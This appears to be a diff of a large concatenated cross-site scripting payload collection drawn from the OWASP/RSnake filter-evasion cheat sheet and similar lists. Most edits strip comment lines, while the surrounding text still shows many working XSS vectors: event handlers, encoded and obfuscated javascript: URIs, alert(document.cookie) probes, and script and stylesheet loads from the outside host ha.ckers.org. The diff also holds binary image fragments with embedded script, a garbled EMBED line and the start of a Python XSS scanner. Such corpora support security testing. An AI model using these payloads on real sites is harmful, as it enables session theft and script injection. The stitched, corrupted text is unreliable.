@@ -8397,7 +8397,6 @@
 <video controls src=1 onfocus=alert(1) autofocus>
 <video controls src=1 onfocusin=alert(1) autofocus>
 <video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE
-
 1
 00:00:00.000 --> 00:00:05.000 
 <b>XSS</b>
@@ -8775,143 +8774,70 @@ perl -e &#39;print &#34;&#38;&#60;SCR&#92;0IPT&#62;alert&#40;&#34;XSS&#34;&#41;&
 &#60;SCRIPT a&#61;&#34;&#62;&#39;&#62;&#34; SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;xss.js&#34;&#62;&#60;&#47;SCRIPT&#62;#
 # https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 # based on the RSnake original http://ha.ckers.org/xss.html
-# Retrieved on 2013-11-20
-# Much of this wildly obsolete
 #
-# XSS Locator 2
-# Grave Accent Obfuscation
 <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
-# Malformed A Tags
 # (not actually malformed)
 <a onmouseover="alert(document.cookie)">xxs link</a>
 <a onmouseover=alert(document.cookie)>xxs link</a>
-# Malformed IMG Tags
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
-# fromCharCode
-# Default SRC tag to get past filters that check SRC domain
 <IMG SRC=# onmouseover="alert('xxs')">
-# Default SRC tag by leaving it empty
 # nickg; Unable to replicate in FF,Safari,Chrome 2014-01-10
 # <IMG SRC= onmouseover="alert('xxs')">
-# Default SRC tag by leaving it out entirely
 <IMG onmouseover="alert('xxs')">
-# Decimal HTML character references
-# obsolete?
 <IMG SRC="/" onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
-# Decimal HTML character references without trailing semicolons
-# obsolete
 <IMG SRC="/x" onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
-# Hexadecimal HTML character references without trailing semicolons
-# obsolete form
  <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 <IMG SRC="/" onerror=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-# Embedded tab
 #<IMG SRC="jav   ascript:alert('XSS');">
 <IMG SRC="/x" onerror="jav      ascript:alert('XSS');">
-# Embedded escaped tab
 #<IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC="/" onerror="jav&#x09;ascript:alert('XSS');">
-# Embedded newline to break up XSS
 #<IMG SRC="jav&#x0A;ascript:alert('XSS');">
-# Embedded CR
 #<IMG SRC="jav&#x0D;ascript:alert('XSS');">
 <IMG SRC="/x" onerror="jav&#x0D;ascript:alert('XSS');">
-# Null
 # <IMG SRC="jav%00ascript:alert('XSS');">
 <IMG SRC="/x" onerror="jav%00ascript:alert('XSS');">
-# Spaces and meta chars before the JavaScript in images for XSS
 #<IMG SRC=" &#14;  javascript:alert('XSS');">
 <IMG SRC="/x" onerror=" &#14;  javascript:alert('XSS');">
-# Non-alpha-non-digit XS
-# this is bogus or obsolete
 # <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-# Extraneous open brackets
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-# No closing script tags
 <SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-# Protocol resolution in script tags
 <SCRIPT SRC=//ha.ckers.org/.j>
 # Half open HTML/JavaScript XSS vector
-# Double open angle brackets
 <iframe src=http://ha.ckers.org/scriptlet.html <
-# Escaping JavaScript escapes
 # N/A
-# End title tag
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
-# INPUT image
-# BODY image
 <BODY BACKGROUND="javascript:alert('XSS')">
-# IMG Dynsrc
-# Wildly obsolete
 <IMG DYNSRC="javascript:alert('XSS')">
-# IMG LOW src
-# Wildy obsolete
 <IMG LOWSRC="javascript:alert('XSS')">
-# List-style-image
-# likely obsolete
 <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
-# VBscript in an image
 # Livescript (older versions of Netscape only)
-# Obsolete
 # <IMG SRC="livescript:[code]">
-# BODY tag
 <BODY ONLOAD=alert('XSS')>
-# BGSOUND
 <BGSOUND SRC="javascript:alert('XSS');"
 # & JavaScript includes
 # <BR SIZE="&{alert('XSS')}">
-# STYLE sheet
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
-# Remote style sheet
 <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
-# Remote style sheet part 2
-# Remote style sheet part 3
 <META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
-# Remote style sheet part 4
-# STYLE tags with broken up JavaScript for XSS
-# STYLE attribute using a comment to break up expression
 <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"
-# IMG STYLE with expression
 # STYLE tag (Older versions of Netscape only)
-# STYLE tag using background-image
-# STYLE tag using background
-# Anonymous HTML with STYLE attribute
-# Local htc file
 <XSS STYLE="behavior: url(xss.htc);">
-# META
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
-# META using data
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
-# IFRAME
-# IFRAME Event based
 <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
-# FRAME
-# TABLE
 <TABLE BACKGROUND="javascript:alert('XSS')">
-# TD
-# DIV background-image
-# DIV background-image with unicoded XSS exploit
 <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.
-# DIV background-image plus extra characters
-# DIV expression
 # "Downlevel-hidden block"
 <!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]-->
-# BASE tag
 <BASE HREF="javascript:alert('XSS');//">
-# Object tag
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
-# Using an EMBED tag you can embed a Flash movie that contains XSS
 <EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>
-# You can EMBED SVG which can contain your XSS vector
 <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
-# Using ActionScript inside flash can obfuscate your XSS vector
-# XML data island with CDATA obfuscation
 <XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
-# Locally hosted XML with embedded JavaScript that is generated using an XML data island
 <XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
-# XSS using HTML quote encapsulatio
 <SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 ?xss0='\"'><script>alert(document.domain)</script>
@@ -8962,7 +8888,6 @@ window.navigate(...)<html>
 <<<
 =
 >
- 
 :
 '
 "
@@ -9478,7 +9403,6 @@ XML Entity XSS  by @garethheyes
 <XML SRC="xsstest.xml" ID=I></XML>
 <?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
 <xmp><img alt="</xmp><img src=xx:x onerror=alert(1)//"> Classic vector by slacker :D 
-# XSS
 xss:&#101;x&#x2F;*XSS*//**pression(alert("XSS"))'>
 <! XSS="><img src=xx:x onerror=alert(1)//">  #Firefox #Opera #Chrome #Safari #XSS 
 <xss><script>alert('XSS')</script></vulnerable>
@@ -18238,7 +18162,6 @@ a(0)</code>
 </xss>
 <a draggable="true" ondrag="alert(1)">test</a>
 <xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
-# credit to rsnake
 innerHTML=location.hash>#<script>alert(1)</script>
 <script>onerror=alert;throw 1337</script>
 <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
@@ -18511,9 +18434,6 @@ XXX
 #group	most-in-one pattern
 "'` ºÀà‚Äò‚Äô‚Äö‚Äõ‚Äú‚Äù‚Äû‚Äü‚Ä≤‚Ä≥‚Ä¥‚Äµ‚Ä∂‚Ä∑ÔπÖÔπêÔºÇÔºáÔºåËàßËâ†Ô∏êÔ∏ë--><script>alert(42)</script>
 #group	general filter evasion
-# real tab
-# URL-encoded
-# Unicode characters
 #group	javascript keywords
 #group	HTML event keywords
 #group	HTML tag attribute keywords
@@ -19076,7 +18996,6 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<name>Event Handlers List 1</name>
 		<code>See Below</code>
 		<desc>Event Handlers that can be used in XSS attacks (this is the most comprehensive list on the net, at the time of this writing). Each one may have different results in different browsers. Thanks to Rene Ledosquet (http://www.secaron.de/) for the HTML+TIME updates:
-			
 -FSCommand() (execute from within an embedded Flash object)
 -onAbort() (when user aborts the loading of an image)
 -onActivate() (when object is set as the active element)
@@ -19184,7 +19103,6 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<code>&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 		<desc>For performing XSS on sites that allow &quot;&lt;SCRIPT>&quot; but don&apos;t allow &quot;&lt;SCRIPT SRC...&quot; by way of a regex filter:
 	/&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i
-	
 (this is an important one, because I&apos;ve seen this regex in the wild)</desc>
 		<name>Evade Regex Filter 3</name>
 		<code>&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
@@ -25746,7 +25664,6 @@ F¡∞  ã&¨€H    IENDÆB`Ç<?xml version="1.0" encoding="ISO-8859-1"?>
 	</opml>
 <?xml version="1.0" standalone="no"?>
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-   
       alert(document.domain);
 </svg><?xml version="1.0" encoding="ISO-8859-1"?>
 F¡∞  ã&¨€H    IENDÆB`Çˇÿˇ‡ JFIF   d d  ˇÏ Ducky     d  ˇÓ Adobe d¿   ˇ€ Ñ ˇ¿    ˇƒ ê               
@@ -25769,10 +25686,8 @@ H»ÁπÁx‰â‚ôd»§‚"rÃCú	$<“2°Lä®«óL`Î+¯Jª`÷⁄œwZÌg{≠v´Ω”&Nf ±ê:ÛxCú¨O˙Z« -√yZ
 q†G¢8C%à√`◊ì∞fL†»ÀF3-âAû¯n¨’˙_ØÿÄ3∂q|˙™sxy›l ù˜›çÕ˝«Ÿ⁄r◊Î‰Ò÷q¬±∫⁄´?=ˇÉ«Î˙îıÇ>ˇ˝6D"˛C*ù”—›ü?æË˝ÙÚ¯’œ'øúæ~sv~qyıÎ€Îwøµwvø}˙ÏªΩÁ€ˇˆÏ?=ˇôù◊>< Õ:FπUú¶õõlXp∆µi¡≤5Py«\∞C‘ÌVõñgÂ¶Ò¡⁄Õå}&™=¡ÜÛë	ﬁ4,‘¥ÉÓ[éï÷X5âØè_‚Wßê˝¶Ä≈…©Æ√ÎÃ0.vé)CTY±1-ö–-óLâ©Ú˝òñDyπ™Å£©frR€†G‚nó˛Ç°K¥rK„ õ*bTúEÖÜ(äçÄàíy`iuÈ üË¿ÚÓÊ7Äy“ É– Ãã≤iI¿˙ô¡¥$HdnIåWñ°•iÉ	µ<-ßò‹7yﬂó"•™œYHΩ:bR(Ê'íÎ;ƒﬂÖÔi¯-ÇπD1yÜπÿS*èπ§ﬂgJ!™ñJxé<ÚÖîÃ◊X≈§’û«CåSO‚U^ü`xqvÇ‡‚EÁ“Äô¿\v0s|z—9«ö⁄Y¬$N≈ UƒF1Ãî·E.wF>ãg2TÕ£˜¯àá8[è›gëÊynÎùôıÆú
 ]?A`á ô:«°ñçÙH$ëı6©ìh]ù„L|âyX‰ûZ!Níı‡-0<´)è®H[[‚≥©_
 /ıs€bØSõ/ƒ-«n_MM]AÔZ<äò|©x<Oáçò·K„-Ù≈ÿ®ò>é4ìCØ»¨ó|¿D¢sP∞–evm ãòaáG3Ikı!≥Içº!<+u˜«¶ôk≥Åwó/‡^ö¶[‘”˛$∫÷ÆYÏz˛m[0‹…¨Ø’£ÀmÌ¿\iÈik√.JFπ¸˚ˆ`Àcb9ì¿Ác©(S±je©¬|5ë°Â{˚ò†2≤6Ke˝±É›G±ß˚AY~T3ó∞A~∑Å/¬t	ÕènjnA„⁄¥$6¥ÊÄéπ ¥Ê wIoZqz¶‚¯˘©oZípe˜µ≤âû!√Ôpô·ΩKïA≈ös™Ólooœi+L´9i©P◊˚g:EÁtÂvë0öüci∑HßÁuOÁteœ«›õè[.Xo≠ÁÖä‰Q´˘ÿµ›mîHgÊ‚˝7PK(Ê÷JB  °  PK    äEH(Ê÷JB  °                   intruderPK      6   x    #!/usr/bin/env python
-# Imports
 import sys, re, urllib2, urlparse, json, time, httplib,cookielib,urllib
 from threadpool import *
-# Config
 DEBUG = True
 MAX_THREAD_COUNT = 10
 SITES_FILENAME = 'sites'
@@ -25879,7 +25794,6 @@ from copy import deepcopy
 from cfghlp import ConfigHelper
 CONFIG_FILE = 'xss.cfg'
 config = None
-# Vars
 protocol_secure = 'https://'
 protocol_nonsecure = 'http://'
 def debug(message):
